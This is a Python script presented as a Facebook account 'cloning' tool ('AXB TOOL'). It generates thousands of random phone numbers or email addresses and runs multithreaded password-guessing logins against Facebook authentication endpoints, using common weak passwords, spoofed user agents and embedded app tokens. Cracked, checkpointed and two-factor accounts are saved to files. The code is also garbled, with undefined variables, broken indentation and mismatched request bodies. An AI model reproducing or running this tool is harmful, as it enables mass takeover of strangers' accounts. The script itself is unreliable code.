
import os
import requests,random,sys,json,os,re
from time import sleep as slp
from os import system as cmd
from datetime import datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as Mr_javed_iqbal_sad_boy
import requests, os, re, bs4, uuid, sys, json, time, random, datetime, subprocess
from rich import print as mr_javed_Iqbal_sad_boy
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as Mr_javed_iqbal_sad_boy
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python BXB.py')
try:
    import requests
except ImportError:
    print('\n\x1b[1;92m [×] request modules installing...')
    os.system('pip install requests')

try:
    import requests
except ImportError:
    print('\n\x1b[1;92m [×] beautiful soup4 modules installing...')
    os.system('pip install bs4')

try:
    import requests
except ImportError:
    print('\n\x1b[1;92m [×] rich modules installing...')
    os.system('pip install rich')

try:
	os.mkdir('/sdcard/BXB_ID')
except:
	pass
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
data,data2={},{}
Apk,ok,cp,id,user = [],[],[],[],[]
loop = 0
javed = []
minx = ' ------------------------------'
sagent=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	sagent.append(xd)
	
	
logo=("""\033[1;37m
 .d8b.  d88888D  .d8b.  d8b   db 
d8' `8b YP  d8' d8' `8b 888o  88 
88ooo88    d8'  88ooo88 88V8o 88 
88~~~88   d8'   88~~~88 88 V8o88 
88   88  d8' db 88   88 88  V888 
YP   YP d88888P YP   YP VP   V8P \033[1;35mX SHONI \033[1;37m                                                                 
----------------------------------------------
 Author    : A Z A N 
 Github    : MR-AZAN
 Facebook  : CHARLIE
 Tool Name : AXB TOOL
 Type type : FREE
 Version   : 1.9.8
----------------------------------------------
FOR GET ON ALLAHA ALMIGHTY 🥺❤️
\033[1;37m----------------------------------------------""")
cod,cod1,cod2,oO = [],[],[],[]
loop = 0
methods,crack_mode,geo,tf = [],[],[],[]

def main():
    print(BXB)
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' [1] clone from file')
    mr_javed_Iqbal_sad_boy(' [2] clone random gmail+number')
    mr_javed_Iqbal_sad_boy(' [3] file creating and cute etc Menu')
    mr_javed_Iqbal_sad_boy(' [0] exit-program')
    mr_javed_Iqbal_sad_boy(minx)
    opt = input(' [+] put:  ')
    if opt =='1':
    	os.system('clear')
    	print(BXB)
    	file_crack()
    elif opt =='2':
    	os.system('clear')
    	print(BXB);random_crack()
    elif opt =='3':
        os.system('python dump.py')
    elif opt =='0':
        exit("\033[1;92m[+] Good bye")
    else:
        mr_javed_Iqbal_sad_boy('\n Choose valid option ... ');os.system ("clear")
        main()
def random_crack():
    global ok,cp,tf
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' [1] Random Number')
    mr_javed_Iqbal_sad_boy(' [2] Random Email ')
    mr_javed_Iqbal_sad_boy(' [0] main-menu')
    mr_javed_Iqbal_sad_boy(minx)
    opt = input(' [+] put: ')   
    if opt =='1':
        os.system('clear && rm -rf .rn.txt')
        print(BXB)
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' [+] any country code without + ')
        mr_javed_Iqbal_sad_boy(minx)
        code = input(' [+] put code: ')
        os.system('clear')
        print(BXB)
        for xd in range(5000):
            no = ''.join(random.choice(string.digits) for _ in range(7))
            open('.rn.txt', 'a').write(code+no+'|'+no+'\n')
        fo = open('.rn.txt','r').read().splitlines()
        with Mr_javed_iqbal_sad_boy(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(BXB)
            mr_javed_Iqbal_sad_boy(minx)
            mr_javed_Iqbal_sad_boy(' [+] Total ids: '+total_ids)            
            mr_javed_Iqbal_sad_boy(' [+] Use flight mode for speed')
            mr_javed_Iqbal_sad_boy(minx)
            for user in fo:
                ids,ps = user.split('|')
                passlist = [ps,'khan123','khan1234','khan12345','khan786']
                crack_submit.submit(random_method,ids,passlist,total_ids)
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' The process has completed')
        mr_javed_Iqbal_sad_boy(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='2':
        os.system('clear && rm -rf .re.txt')
        print(BXB)
        first = input(' [+] put first name: ')
        os.system('clear')
        print(BXB)
        last = input(' [+] put last name: ')
        os.system('clear')
        print(BXB)
        domain = input('\n [+] put domain: ')
        os.system('clear')
        print(BXB)
        lists = ['3','4']
        for xd in range(4999):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
        xd_ps=input('  Do you want additional passwords (y/n) ? ')
        fo = open('.re.txt', 'r').read().splitlines()
        with Mr_javed_iqbal_sad_boy(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(BXB)
            mr_javed_Iqbal_sad_boy(minx)
            mr_javed_Iqbal_sad_boy(' Total ids: '+total_ids)
            mr_javed_Iqbal_sad_boy(' Use flight mode for speed')
            mr_javed_Iqbal_sad_boy(minx)
            for user in fo:
                ids,name = user.split('|')
                first_name = name.rsplit(' ')[0]
                try:
                    last_name = name.rsplit(' ')[1]
                except IndexError:
                    last_name = 'Khan'
                fs = first_name.lower()
                ls = last_name.lower()
                if xd_ps =='n':
                    passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'1234',fs+'12345',fs+'786',fs+'12',fs+'1122']
                    crack_submit.submit(random_method,ids,passlist,total_ids)
                else:
                    passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'1234',fs+'12345',fs+'786',fs+'12',fs+'1122']
                    crack_submit.submit(random_method,ids,passlist,total_ids)
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' The process has completed')
        mr_javed_Iqbal_sad_boy(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='0':
        main()
    else:
        mr_javed_Iqbal_sad_boy('please put correct adress... ')
        time.sleep(1)
        random_crack()

def file_crack():
    global ok,cp,tf
    os.system('clear')
    print(BXB)
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' [1] Method ')
    mr_javed_Iqbal_sad_boy(' [2] Method ')
    mr_javed_Iqbal_sad_boy(' [3] Method ')
    mr_javed_Iqbal_sad_boy(' [4] Method ')
    mr_javed_Iqbal_sad_boy(minx)
    opt_method = input(' [+] put method: ')
    os.system('clear')
    print(BXB)
    file = input(' [+] put file path: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        mr_javed_Iqbal_sad_boy(' No file found on provided path ...')
        time.sleep(1)
        file_crack()
    plist = []
    try:
        ps_limit = int(input('\nhow many password do you want to add? '))
    except:
        ps_limit =1
    print(' ')
    for i in range(ps_limit):
        plist.append(input(f' Put password {i+1}: '))
    with Mr_javed_iqbal_sad_boy(max_workers=25) as crack_submit:
        os.system('clear')
        print(BXB)
        total_ids = str(len(fo))
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' total ids: '+total_ids)
        mr_javed_Iqbal_sad_boy(' use flight mode for speed')
        mr_javed_Iqbal_sad_boy(minx)
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if opt_method =='1':
                crack_submit.submit(method1,ids,names,passlist,total_ids)
            elif opt_method =='2':
                crack_submit.submit(method2,ids,names,passlist,total_ids)
            elif opt_method =='3':
                crack_submit.submit(method3,ids,names,passlist,total_ids)
            elif opt_method =='4':
                crack_submit.submit(method4,ids,names,passlist,total_ids)
            else:
                mr_javed_Iqbal_sad_boy(' something wrong in methods ');exit()
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' The process has completed')
    mr_javed_Iqbal_sad_boy(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
    input('\n Press enter to back ')
    main()
def method1(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M1| %s |OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            nip=random.choice(prox)
            ua = random.choice(sagent)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = "https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
            hed1 = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
            req1 = r.get(url1,headers=hed1)
            data = {
            'Isd': lsd, 
            'jazoest': j2, 
            'ccp' : ccp, 
            'reg_instance' :reg_i, 
            'submission_request':'true', 
            'helper' : '', 
            'reg_impression_id' :reg_id, 
            'ns' :'0',
            'zero_header_af_client' :'', 
            'app_Id' :'', 
            'logger_id':'', 
            'field_names[]':[
                'firstnames', 
                'reg_email__', 
                'sex', 
                'birthday_wrapper', 
                'reg_password__' 
            ], 
            'firstname' :'nmf', 
            'lastname' :'nmf', 
            'reg_mail':id, 
            'sex' :str(random. choice(['1','2'])), 
            'custom_gender' :'', 
            'did_u_age':'fasle', 
            'birthday_day' :dayy, 
            'birthday_month':monn, 
            'birthday_year' :yearr, 
            'age_setup_input' :'', 
            'reg_passwd':paswrd, 
            'submit' :'sign_up' 
           } 
            url2 = 'https://b-api.facebook.com/method/auth.login'
            hed2 = {'content-type':'application/x-www-form-urlencoded',
            'x-fb-sim-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-type':'unknown',
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent':ua_string,
            'x-fb-net-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
            'x-fb-connection-quality':'EXCELLENT'
            'x-fb-friendly-name':'authenticate',
            'accept-encoding':'gzip, deflate',
            'x-fb-http-engine':     'Liger'}
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
            print('\r\r\033[1;32m [AXB-SUCCESSFULL] '+ids+' | '+pas+'\033[1;97m')
            open('/sdcard/AXB-OK.txt','a').write(ids+'|'+pas+'\n')
            oks.append(ids)
            break
     elif 'www.facebook.com' in q['error_msg']:
            if 'y' in pcp:
            print('\r\r\x1b[38;5;208m [AXB-CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
            open('/sdcard/AXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
            cps.append(ids)
            break
         else:continue
          loop+=1
    except Exception as e:
        pass
def method2(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M2| %s |OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            nip=random.choice(prox)
            ua = random.choice(sagent)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = "https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
            hed1 = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
            req1 = r.get(url1,headers=hed1)
            data = {
            'Isd': lsd, 
            'jazoest': j2, 
            'ccp' : ccp, 
            'reg_instance' :reg_i, 
            'submission_request':'true', 
            'helper' : '', 
            'reg_impression_id' :reg_id, 
            'ns' :'0',
            'zero_header_af_client' :'', 
            'app_Id' :'', 
            'logger_id':'', 
            'field_names[]':[
                'firstnames', 
                'reg_email__', 
                'sex', 
                'birthday_wrapper', 
                'reg_password__' 
            ], 
            'firstname' :'nmf', 
            'lastname' :'nmf', 
            'reg_mail':id, 
            'sex' :str(random. choice(['1','2'])), 
            'custom_gender' :'', 
            'did_u_age':'fasle', 
            'birthday_day' :dayy, 
            'birthday_month':monn, 
            'birthday_year' :yearr, 
            'age_setup_input' :'', 
            'reg_passwd':paswrd, 
            'submit' :'sign_up' 
           } 
            url2 = 'https://b-api.facebook.com/method/auth.login'
            hed2 = {'content-type':'application/x-www-form-urlencoded',
            'x-fb-sim-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-type':'unknown',
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent':ua_string,
            'x-fb-net-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
            'x-fb-connection-quality':'EXCELLENT'
            'x-fb-friendly-name':'authenticate',
            'accept-encoding':'gzip, deflate',
            'x-fb-http-engine':     'Liger'}
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
            print('\r\r\033[1;32m [AXB-SUCCESSFULL] '+ids+' | '+pas+'\033[1;97m')
            open('/sdcard/AXB-OK.txt','a').write(ids+'|'+pas+'\n')
            oks.append(ids)
            break
     elif 'www.facebook.com' in q['error_msg']:
            if 'y' in pcp:
            print('\r\r\x1b[38;5;208m [AXB-CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
            open('/sdcard/AXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
            cps.append(ids)
            break
         else:continue
          loop+=1
    except Exception as e:
        pass
def method3(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M3| %s |OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            nip=random.choice(prox)
            ua = random.choice(sagent)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = "https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
            hed1 = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
            req1 = r.get(url1,headers=hed1)
            data = {
            'Isd': lsd, 
            'jazoest': j2, 
            'ccp' : ccp, 
            'reg_instance' :reg_i, 
            'submission_request':'true', 
            'helper' : '', 
            'reg_impression_id' :reg_id, 
            'ns' :'0',
            'zero_header_af_client' :'', 
            'app_Id' :'', 
            'logger_id':'', 
            'field_names[]':[
                'firstnames', 
                'reg_email__', 
                'sex', 
                'birthday_wrapper', 
                'reg_password__' 
            ], 
            'firstname' :'nmf', 
            'lastname' :'nmf', 
            'reg_mail':id, 
            'sex' :str(random. choice(['1','2'])), 
            'custom_gender' :'', 
            'did_u_age':'fasle', 
            'birthday_day' :dayy, 
            'birthday_month':monn, 
            'birthday_year' :yearr, 
            'age_setup_input' :'', 
            'reg_passwd':paswrd, 
            'submit' :'sign_up' 
           } 
            url2 = 'https://b-api.facebook.com/method/auth.login'
            hed2 = {'content-type':'application/x-www-form-urlencoded',
            'x-fb-sim-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-type':'unknown',
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent':ua_string,
            'x-fb-net-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
            'x-fb-connection-quality':'EXCELLENT'
            'x-fb-friendly-name':'authenticate',
            'accept-encoding':'gzip, deflate',
            'x-fb-http-engine':     'Liger'}
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
            print('\r\r\033[1;32m [AXB-SUCCESSFULL] '+ids+' | '+pas+'\033[1;97m')
            open('/sdcard/AXB-OK.txt','a').write(ids+'|'+pas+'\n')
            oks.append(ids)
            break
     elif 'www.facebook.com' in q['error_msg']:
            if 'y' in pcp:
            print('\r\r\x1b[38;5;208m [AXB-CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
            open('/sdcard/AXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
            cps.append(ids)
            break
         else:continue
          loop+=1
    except Exception as e:
        pass
def method4(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M4| %s | OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            data={"adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email":ids,
            "password":pas,
            "access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
            "generate_session_cookies":"1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_PK",
            "client_country_code": "PK",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            post = r.post("https://graph.facebook.com/auth/login",data=data)
            q = json.loads(post.text)
            if 'access_token' in q:
                print('\033[1;32m[AXB-SUCCESSFUL] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'two_factor' in str(q):
                print('\033[1;35m[AXB-2FACTOR] '+ids+' | '+pas+'\033[0;97m')
                tf.append(ids)
                open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'temporarily unavailable' in str(q):
                print('\033[1;31m[AXB-CHECKPOINT] '+ids+' | '+pas+'\033[0;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
def random_method(ids,passlist,total_ids):
    global ua,loop,ok,cp,tf,ua_opera
    smm = random.choice(sagent)
    sys.stdout.write('\r \033[1;37m%s | OK:%s | CP:%s  '%(loop,len(ok),len(cp)));sys.stdout.flush()
    try:
        for pas in passlist:
            xyz = requests.Session()
            header = ({
                'authority': 'free.facebook.com',
			'method': 'GET',
			'path': '/login/device-based/login/async/',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://free.facebook.com',
			'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agen': 'Mozilla/5.0 (Linux; Android 11; Infinix X657B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 Instagram 218.0.0.19.108 Android (30/11; 320dpi; 720x1432; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; 345526700)'
            })
            url =( 'https://free.facebook.com/login/?ref=dbl&fl&login_from_aymh=1')
#https://mbasic.facebook.com'
            raw = xyz.get(url).text
            payload = {
        'batch': '[{"method":"POST","body":"format=json&device_id=0cd272a7-17dc-4766-958e-5b48799250bf&email='+ids+'&password='+pas+'&credentials_type=password&generate_session_cookies=1&error_detail_type=button_with_disabled&machine_id='+random_machine_id()+'&locale=en_US&client_country_code=US&fb_api_req_friendly_name=authenticate","name":"authenticate","omit_response_on_success":false,"relative_url":"method/auth.login"},{"method":"POST","body":"query_id=10153437257771729&method=get&strip_nulls=true&query_params=%7B%220%22%3A75%2C%221%22%3A120%2C%222%22%3A480%7D&locale=en_US&client_country_code=US&fb_api_req_friendly_name=GetLoggedInUserQuery","name":"getLoggedInUser","depends_on":"authenticate","omit_response_on_success":false,"relative_url":"graphql?access_token={result=authenticate:$.access_token}"}]','fb_api_caller_class': 'com.facebook.katana.server.handler.Fb4aAuthHandler','fb_api_req_friendly_name': 'authLogin'
        }
            post_request = xyz.post("https://b-api.facebook.com/method/auth.login")
#https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=payload,headers=header).text
            #open('regular_login.html','w').write(post_request)
            cookies = xyz.cookies.get_dict().keys()
            if 'c_user' in cookies:
                    print('\033[1;32m[AXB-SUCCESSFULL] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/BXB_ID/ok.txt', 'a').write(ids+' | '+pas+'\n').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    pass
                else:
                    d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                    if 'Enter login code to continue' in str(d.group(1)):
                        print('\033[1;35m[AXB-2FACTOR] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/BXB_ID/random2f.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                        else:
                            print('\033[1;31m[AXB-CHECKPOINT] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/BXB_ID/randomcp.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
        loop+=1
    except Exception as e:
        pass
os.system('clear');main()
